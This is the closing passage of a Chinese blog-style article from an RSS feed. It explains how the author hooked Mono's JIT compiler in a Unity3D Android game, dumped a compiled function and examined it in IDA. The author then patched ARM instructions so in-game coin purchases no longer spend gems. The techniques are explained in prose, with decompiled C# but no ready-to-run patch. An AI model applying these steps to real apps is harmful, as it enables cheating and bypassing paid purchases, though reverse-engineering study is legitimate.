-	}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如上述代码所示，这次 hook 在 mono_jit_compile_method_with_opt 函数每次编译 C# 函数点进行判断，当被编译的函数是我们的目标 MainButtonClicked 时，对内存进行 dump ，将编译成机器码的 MainButtonClicked 输出出来，接下来，使用 IDA 对该函数进行分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在加载该函数时需要注意，由于 dump 出来的是部分内存，不像标准的 elf 文件一样有各种配置能够加载，识别为 binary file ，需要手动指定处理器架构，这里是 ARM 。另外需要指定硬盘文件偏移和程序在内存中偏移的映射关系，注意上边代码中第四行输出了程序在内存中的地址，IDA 能够利用 file_offset+memory_base 计算出相当一部分的跳转指令的跳转地址（当然，由于我们只 dump 了很小一部分内存，仍然有很多依赖相对偏移寻址的跳转目标无法恢复，但对程序结构的分析无太大影响）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 IDA 加载后，可以看出函数明显是一个 switch-case 结构：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-18af552a8585f0802182b8d233b5501a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;726&quot; data-rawheight=&quot;485&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个结构与 MainButtonClicked 函数原始形式一致，通过分析二者关系可以定位到金币购买时点击确定按键对应到的 case ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;		case UI_ConfirmationPopup.ScreenType.BuyCoins:
-		{
-			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
-			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
-			if (UserProfile.Gems &amp;gt;= num)
-			{
-				UserProfile.Gold += num2;
-				UserProfile.Gems -= num;
-				this.purchasedAmount = num2;
-				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
-				Events.Instance.UI_MARKET_PURCHASED();
-				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
-				this.CallItQuits();
-			}
-			else
-			{
-				this.DisableAssets(true);
-				this.LaunchOutOfGems();
-			}
-			break;
-		}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-cdc0d4b206e0401f62255f720f602fe9_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;途中的两个分支就是 C# 中的 if-else 。由于高级语言数据结构比较复杂，反应在机器码层面取数据涉及问题较多，因此修改取数据比较困难。但是可以看到，上面的 block 中 R5 是最后取出的当前剩余宝石，当与其进行比较之后，如果宝石充足，则会跳转到红色分支开始购买，增加金币扣除宝石。因此应当修改的逻辑是图中 1 处，通过 nop（mov r0, r0）掉跳转强制执行购买流程。为了在修改金币的同时不减少宝石，将2处宝石运算改为 add r0 , r0 , r5 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;确定了修改点之后将上述两条命令汇编，使用之前的 hook 稍作修改，当执行到 MainButtonClicked 编译时修改程序机器码（ mono 已经很贴心的 mprotect 过了），完成对游戏的修改，接下来尝试购买宝石，哇，奇迹发生了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X04  后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文从一个简单小游戏的破解出发，介绍了 Unity3D 引擎使用 mono 进行 C# JIT 编译的思路，并设计了实验性质的 hook 方案。其实针对这款简单的小游戏，更简单的破解方式还有很多种，牛刀杀鸡是为了以后更容易杀牛。因为在实际的环境中，分析游戏面临着过反调试、脱壳、对抗去符号、DLL 解密等多重挑战。限于篇幅不可能对这些技术一一介绍，感兴趣的朋友可以自行百度/谷歌。另外，由于使用了 AOT 机制，文章中介绍的 hook 思路可能会更适用于 iOS ，条件所限没有尝试。攻击是为了更好的防御，使用的实例，介绍的工具都为了更好的说明技术本身，请不要用违法的目的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考文献&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;[1]: &lt;a href=&quot;http://www.cnblogs.com/murongxiaopifu/p/4211964.html&quot;&gt;Mono为何能跨平台？聊聊CIL(MSIL) - 慕容小匹夫 - 博客园&lt;/a&gt;	&quot;Mono为何能跨平台？聊聊CIL(MSIL)&quot;&lt;/p&gt;&lt;p&gt;[2]: &lt;a href=&quot;http://www.ecma-international.org/&quot;&gt;Welcome to Ecma International&lt;/a&gt;	&quot;EMCA官网&quot;&lt;/p&gt;&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt;	&quot;Android Inline Hook&quot;&lt;/p&gt;&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/mono/mono&quot;&gt;mono/mono&lt;/a&gt;	&quot;Mono Project on Github&quot;&lt;/p&gt;&lt;p&gt;[5]: &lt;a href=&quot;https://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt;	&quot;古河大大libinject&quot;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
-<author>perhaps</author>
-<guid isPermaLink="false">2017-11-07-30703785</guid>
-<pubDate>Tue, 07 Nov 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
